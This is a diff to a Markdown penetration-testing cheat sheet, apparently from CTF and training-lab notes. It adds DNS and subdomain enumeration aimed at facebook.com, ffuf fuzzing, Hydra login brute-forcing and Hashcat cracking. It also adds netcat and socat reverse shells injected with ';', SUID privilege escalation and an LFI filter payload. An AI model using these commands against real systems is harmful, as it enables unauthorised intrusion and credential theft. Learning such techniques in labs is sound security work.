@@ -55,7 +55,7 @@ If you also have a 4k-panel, you probably will face some scaling issues like me.
 | `uname`    | Prints basic information about the operating system name and system hardware. |
 | `pwd`    | Returns working directory name. |
 | `ifconfig`    | The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters. |
-| `ip`    | Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels. |
+| `ip`    | IP is a utility to show or manipulate routing, network devices, interfaces and tunnels. |
 | `netstat`	    | Shows network status. |
 | `ss`   | Another utility to investigate sockets. |
 | `ps`    | Shows process status. |
@@ -482,6 +482,7 @@ $ dig any google.com @8.8.8.8
 To find all available subdomains we can use `Project Sonar`:
 
 ```shell
+$ export TARGET="facebook.com"
 $ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r '.[]' | sort -u
 ```
 
@@ -525,12 +526,120 @@ $ whatweb -a 1 https://www.facebook.com -v
 *(-a    = Set the aggression level. 1(low) - 4(high) 
   -v    = verbose)
 ```
-<!-- USE wafwoof to detect the CMS!!! -->
+#### Active Subdomain Enumeration (Zone transfer)
+
+1. Identifying Nameservers:
+    ```shell
+    nslookup -type=NS <target>
+    ```
+
+2. Testing for `ANY` and `AXFR` Zone Transfer:
+    ```shell
+    nslookup -type=any -query=AXFR <target> <nameserver>
+    ```
+
+#### Gobuster - DNS
+
+First we need to create our pattern file, which is described in Project Sonar section. Now we can export the parameters and run the `gobuster` command.
+
+```shell
+$ export TARGET="facebook.com"
+$ export NS="d.ns.facebook.com"
+$ export WORDLIST="numbers.txt"
+$ gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"
+```
+```text
+*(-q   = Don't print the banner and other noise
+  -r   = Use custom DNS server
+  -d   = A target domain name
+  -p   = Path to the patterns file
+  -w   = Path to the wordlist
+  -o   = Output file)
+```
+
+## ffuf
+
+`ffuf` is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.
+
+### Performance
+
+To increase the speed of `ffuf` we can increase the number of threads with the `-t` flag, but it is important that we don't give `ffuf` too much power because it could lead in a `DoS`.
+
+```shell
+$ ffuf -w <SNIP> -u <SNIP> -t 200
+```
+
+### Directory Fuzzing
+
+With the `-w` flag we can pass our wordlist, with `-u` the URL we want to fuzz. 
+To tell `ffuf` where we want to fuzz, we need to place the `FUZZ` keyword this can look like the following command:
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
+```
+
+### Page Fuzzing
+
+If we want, we can combine two keywords in one search. For that we can use `FUZZ_1.FUZZ_2`.
+#### Extension Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
+```
+
+#### Page Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
+```
+
+### Recursive Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+```
+```text
+*(-recursion              = scans the directory recursive
+  -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
+  -e .php                 = specify the extension
+  -v                      = output the full URLs)
+```
+
+### Subdomain Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/
+```
+
+### Vhost Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx
+```
+```
+*(-H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon.
+  -fs xxx                     = filter all incorrect results)
+```
+
+### Parameter Fuzzing
+
+#### GET Request
+
+```shell
+$ ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
+```
+
+#### POST Request
+
+```shell
+$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+```
 
 ## Exploiting Network Services
 
 ### GitHub Repos
 [SecLists] (https://github.com/danielmiessler/SecLists)
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
 ### SSH
 Authenticate via ssh with the key-file `id_rsa`:
@@ -545,10 +654,11 @@ $ ssh -i id_rsa user@10.10.10.10
 ### NMAP
 Checks open ports in defined range and check running services with `Nmap`:
 ```bash
-$ nmap 10.10.221.8 -sV -p 0-60000
+$ nmap 10.10.221.8 -sV -p- -v
 ```
 ```text
 *(-p-  = Scans the whole portrange
+  -v   = verbose
   -p   = Specific port or portrange
   -sV  = Attempts to determine the version of the service running on port
   -A   = Enables OS detection, version detection, script scanning and traceroute)
@@ -575,6 +685,16 @@ $ hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [ftp]     = Sets the protocol)
+```
+
+On PHP
+
+```shell
+hydra -l admin -P /usr/shared/rockyou.txt <ip> http-post-form "/login.php?username=^USER^&password=^PASS^:F=Invalid Username or Password"
+```
+
+```shell
+hydra http-post-form -U # For help
 ```
 
 ### NFS
@@ -628,6 +748,10 @@ $ mysql -h [IP] -u [username] -p
   -p             = The password to use when connecting to the server)
 ```
 
+1. `use <database>;`
+2. `show tables;`
+3. `select * from <tablename>;`
+
 If we do not have any credentials we can use `Nmap` or `Metasplot` to gain this information:
 ```Nmap```
 ```bash
@@ -670,7 +794,12 @@ $ john --show --format=RAW-MD5 hash.txt
   --format=<param>  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt
 ```
 
+### Hashcat
 
+
+```shell
+$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt
+```
 ## Web Fundamentals
 
 ### Curl
@@ -694,8 +823,40 @@ $ curl -X GET http://10.10.4.59:8081/ctf/post
 
 ### Reverse Shell
 
+#### Netcat
+
+Listener:
 ```shell
-$ ;nc -e /bin/bash
+$ nc -lvnp 4242
+```
+
+Victim:
+```shell
+$ ;nc -e /bin/sh 10.0.0.1 4242
+```
+
+#### Socat
+
+Lister:
+```shell
+$ socat -d -d TCP4-LISTEN:4443 STDOUT
+```
+
+Victim (Linux):
+```shell
+$ ;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash
+```
+
+Victim (Windows):
+```shell
+$ ;socat TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes
+```
+
+#### Stabilize Shell
+
+You can stabilize the shell with the python module `pty`:
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 For more information checkout the following GitHub repo: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
@@ -720,3 +881,21 @@ If you gain access depending on the OS you can try the following commands to get
   $ tasklist
   $ netstat -an
   ```
+
+### Privilege Escalation
+
+#### Exploiting SUID
+
+```shell
+find / -perm /4000 2>/dev/null
+```
+
+```shell
+sudo chmod +s bash
+```
+
+## LFI
+
+```
+entry=php://filter/convert.base64-encode/resource=index.php
+```
